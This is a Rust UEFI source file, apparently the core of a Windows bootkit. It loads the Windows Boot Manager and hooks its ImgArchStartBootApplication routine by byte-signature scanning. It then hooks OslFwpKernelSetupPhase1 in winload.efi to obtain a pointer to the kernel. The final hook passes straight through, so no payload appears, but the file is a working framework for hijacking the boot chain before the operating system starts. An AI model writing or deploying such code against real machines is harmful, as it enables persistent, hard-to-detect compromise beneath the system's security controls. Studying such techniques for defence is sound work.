#![no_main]
#![no_std]

extern crate alloc;

mod boot;
mod hook;
mod utils;

use alloc::slice;
use core::ffi::c_void;
use core::u8;

use hook::{Hook, ImgArchStartBootApplication, OslFwpKernelSetupPhase1};
use uefi::prelude::*;
use uefi::proto::loaded_image::LoadedImage;
use uefi::table::boot::LoadImageSource;

const IMG_ARCH_START_BOOT_APPLICATION_SIGNATURE: &str = "48 8B C4 48 89 58 20 44 89 40 18 48 89 50 10 48 89 48 08 55 56 57 41 54 41 55 41 56 41 57 48 8D 68 A9";
const OSL_EXECUTE_TRANSITION_SIGNATURE: &str = "E8 ? ? ? ? 8B D8 E8 ? ? ? ? 48 83 3D ? ? ? ? ?";
const OSL_FWP_KERNEL_SETUP_PHASE1_SIGNATURE: &str = "E8 ? ? ? ? 8B F0 85 C0 79 ?";

static mut IMG_ARCH_START_BOOT_APPLICATION: Option<Hook<ImgArchStartBootApplication>> = None;
static mut OSL_FWP_KERNEL_SETUP_PHASE1: Option<Hook<OslFwpKernelSetupPhase1>> = None;

#[entry]
fn efi_main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
    uefi_services::init(&mut system_table).unwrap();
    let boot_services = system_table.boot_services();
    log::info!("[*] Searching Windows EFI bootmgr");
    let bootmgr_device_path = boot::windows_bootmgr_device_path(boot_services)
        .expect("Failed to find Windows Boot Manager. Is Windows installed?");
    log::info!("[+] Found! Loading Boot Manager into memory");
    let bootmgr_handle = boot_services
        .load_image(
            image_handle,
            LoadImageSource::FromDevicePath {
                device_path: &bootmgr_device_path,
                from_boot_manager: false,
            },
        )
        .unwrap();
    setup_hooks(&bootmgr_handle, boot_services);
    log::info!("[+] Starting Windows Boot Manager");
    system_table.boot_services().stall(2_000_000);
    boot_services
        .start_image(bootmgr_handle)
        .expect("Failed to start Windows Boot Manager");
    Status::SUCCESS
}

fn setup_hooks(bootmgr_handle: &Handle, boot_services: &BootServices) {
    // Find and hook ImgArchStartBootApplication to recover control when winload.efi is ready to be executed
    log::info!("[*] Setting up ImgArchStartBootApplication hook");
    let bootmgr_image = boot_services
        .open_protocol_exclusive::<LoadedImage>(*bootmgr_handle)
        .unwrap();
    let (bootmgr_base, bootmgr_size) = bootmgr_image.info();
    let bootmgr_data =
        unsafe { slice::from_raw_parts(bootmgr_base as *const _, bootmgr_size as _) };
    let offset = utils::find_pattern(IMG_ARCH_START_BOOT_APPLICATION_SIGNATURE, bootmgr_data)
        .expect("Unable to match ImgArchStartBootApplication signature");
    unsafe {
        IMG_ARCH_START_BOOT_APPLICATION = Some(Hook::new(
            bootmgr_base.add(offset) as *mut _,
            img_arch_start_boot_application_hook as *const _,
        ));
    };
}

fn img_arch_start_boot_application_hook(
    app_entry: *mut c_void,
    winload_base: *mut c_void,
    winload_size: u32,
    boot_option: u8,
    return_arguments: *mut c_void,
) {
    log::info!("[+] ImgArchStartBootApplication hook successful!");
    let img_arch_start_boot_application =
        unsafe { IMG_ARCH_START_BOOT_APPLICATION.take().unwrap().unhook() };

    // Find and hook OslFwpKernelSetupPhase1 to get a pointer to ntoskrnl
    log::info!("[*] Setting up OslFwpKernelSetupPhase1 hook");
    unsafe {
        let winload_data = slice::from_raw_parts(winload_base as *const u8, winload_size as _);
        // To try and keep the hooking method version-independent, we will first search for OslExecuteTransiion
        let offset = utils::find_pattern(OSL_EXECUTE_TRANSITION_SIGNATURE, winload_data)
            .expect("Unable to match OslExecuteTransition signature");
        let osl_execute_transition_address =
            utils::relative_address(winload_base.add(offset), utils::RELATIVE_JMP_SIZE);
        let osl_execute_transition_data =
            slice::from_raw_parts(osl_execute_transition_address as *const u8, 0x4f);
        let offset = utils::find_pattern(
            OSL_FWP_KERNEL_SETUP_PHASE1_SIGNATURE,
            osl_execute_transition_data,
        )
        .expect("Unable to match OslFwpKernelSetupPhase1 signature");
        let osl_fwp_kernel_setup_phase1_address = utils::relative_address(
            osl_execute_transition_address.add(offset),
            utils::RELATIVE_JMP_SIZE,
        );
        OSL_FWP_KERNEL_SETUP_PHASE1 = Some(Hook::new(
            osl_fwp_kernel_setup_phase1_address as *mut _,
            osl_fwp_kernel_setup_phase1_hook as *const _,
        ));
    }

    log::info!("[*] Resuming ImgArchStartBootApplication execution");
    img_arch_start_boot_application(
        app_entry,
        winload_base,
        winload_size,
        boot_option,
        return_arguments,
    )
}

fn osl_fwp_kernel_setup_phase1_hook(loader_block: *mut u8) {
    let osl_fwp_kernel_setup_phase1 =
        unsafe { OSL_FWP_KERNEL_SETUP_PHASE1.take().unwrap().unhook() };
    osl_fwp_kernel_setup_phase1(loader_block)
}
